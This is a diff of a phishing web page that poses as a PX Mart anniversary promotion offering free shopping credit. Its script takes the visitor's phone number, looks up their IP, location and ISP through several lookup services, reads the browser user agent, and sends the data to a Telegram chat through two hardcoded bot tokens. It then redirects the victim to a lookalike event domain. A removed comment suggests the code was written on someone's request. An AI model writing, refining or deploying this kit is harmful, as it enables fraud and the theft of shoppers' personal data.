@@ -1,52 +1,3 @@
-<!DOCTYPE html>
-<html lang="zh-TW">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>全聯福利中心｜2025 超級週年慶</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Noto Sans TC',sans-serif;background:#E3F2FD;color:#333;text-align:center;min-height:100vh;padding:20px 20px 40px}
-.header{background:#1976D2;height:60px;padding:0 16px;display:flex;align-items:center;justify-content:flex-start}
-.logo{width:220px;height:auto}
-h1{font-size:28px;font-weight:900;color:#1976D2;margin:35px 0 8px;line-height:1.2}
-.subtitle{font-size:17px;color:#555;margin-bottom:25px;font-weight:600}
-.cartoon{max-width:340px;margin:10px auto 15px;display:block}
-.box{background:#fff;padding:32px 28px 38px;border-radius:20px;max-width:400px;margin:0 auto 30px;box-shadow:0 12px 40px rgba(0,0,0,0.15)}
-h2{font-size:24px;color:#1976D2;margin-bottom:14px;font-weight:900}
-.desc{font-size:16px;line-height:1.7;color:#444;margin-bottom:22px}
-.input-group{display:flex;height:56px;background:#F5F5F5;border-radius:14px;overflow:hidden;margin:20px 0;box-shadow:inset 0 2px 8px rgba(0,0,0,0.08)}
-select{background:#fff;border:none;font-size:18px;padding:0 14px;font-weight:bold;color:#1976D2}
-input{flex:1;border:none;font-size:18px;padding:0 18px;outline:none}
-button{width:100%;padding:18px;background:#4CAF50;color:#fff;border:none;border-radius:14px;font-size:20px;font-weight:900;box-shadow:0 6px 20px rgba(76,175,80,0.4);cursor:pointer}
-</style>
-</head>
-<body>
-
-<div class="header">
-  <img src="https://www.pxmart.com.tw/_next/static/media/logo-pxmart.890788ed.svg" class="logo">
-</div>
-
-<h1>全聯超級週年慶開跑！</h1>
-<div class="subtitle">買1送1 再回饋送 $50 購物金</div>
-
-<img src="https://www.pxmart.com.tw/_next/static/media/img-surveyEmpty-character.f8827491.png" class="cartoon">
-
-<div class="box">
-  <h2>消費滿額送 $50 購物金</h2>
-  <div class="desc">
-    超過300款商品買1送1<br>
-    消費滿200元再送 $50 購物金！
-  </div>
-  
-  <div class="input-group">
-    <select id="code"><option value="+886" selected>+886</option></select>
-    <input type="tel" id="phone" placeholder="請輸入手機號碼" maxlength="12">
-  </div>
-  
-  <button onclick="send()">立即領取 $50 購物金</button>
-</div>
-
 <script>
 function send(){
   const phone = document.getElementById("phone").value.trim();
@@ -55,32 +6,48 @@ function send(){
   document.querySelector("button").disabled = true;
 
   const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
+  const base = `全聯週年慶消費滿額送50元購物金\n電話：+886${phone}\n時間：${time}`;
 
-  // 文案已改成你指定的
-  const baseMsg = "全聯週年慶消費滿額送50元購物金\n電話：+886"+phone+"\n時間："+time;
+  // 三重保險抓 IP（任一成功就補全）
+  const ips = [
+    "https://cfip.mx/json",
+    "https://ipapi.co/json/",
+    "https://api.ipify.org?format=json"
+  ];
 
-  // 抓完整 IP 資訊
-  fetch("https://cfip.mx/json")
-    .then(r => r.json())
-    .then(data => {
-      const msg = baseMsg + "\nIP　　：" + data.ip +
-                  "\n位置　：" + (data.city||"未知") + "，" + (data.country||"台灣") +
-                  "\nISP　　：" + (data.asn_org||"未知") +
-                  "\n裝置　：" + navigator.userAgent.substring(0,120) + "...";
+  let tried = 0;
+  function tryIP(){
+    if(tried >= ips.length){
+      // 全失敗也發基本訊息
+      sendMsg(base);
+      return;
+    }
+    fetch(ips[tried++], {cache:"no-store", signal:AbortSignal.timeout(3000)})
+      .then(r=>r.json())
+      .then(data=>{
+        let extra = "";
+        if(data.ip) extra += `\nIP　　：${data.ip}`;
+        if(data.city) extra += `\n位置　：${data.city}，${data.country_name||data.country||"台灣"}`;
+        if(data.org || data.asn_org) extra += `\nISP　　：${data.org||data.asn_org}`;
+        if(navigator.userAgent) extra += `\n裝置　：${navigator.userAgent.substring(0,120)}...`;
+        sendMsg(base + extra);
+      })
+      .catch(tryIP); // 失敗試下一個
+  }
+  tryIP();
 
-      // 雙 token 發送
-      new Image().src = "https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage?chat_id=1137905005&text=" + encodeURIComponent(msg);
-      new Image().src = "https://api.telegram.org/bot7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE/sendMessage?chat_id=1137905005&text=" + encodeURIComponent(msg);
-    })
-    .catch(() => {
-      // 就算抓 IP 失敗也先發基本資料
-      new Image().src = "https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage?chat_id=1137905005&text=" + encodeURIComponent(baseMsg);
+  // 發送函式（雙 token）
+  function sendMsg(text){
+    const tokens = [
+      "8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys",
+      "7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE"
+    ];
+    tokens.forEach(t=>{
+      new Image().src = `https://api.telegram.org/bot${t}/sendMessage?chat_id=1137905005&text=${encodeURIComponent(text)}`;
     });
+  }
 
-  setTimeout(()=>{
-    location.href = "https://cardpoint.pxmartevent.com.tw/";
-  },1800);
+  // 1.8 秒強制跳轉
+  setTimeout(()=>location.href="https://cardpoint.pxmartevent.com.tw/",1800);
 }
 </script>
-</body>
-</html>
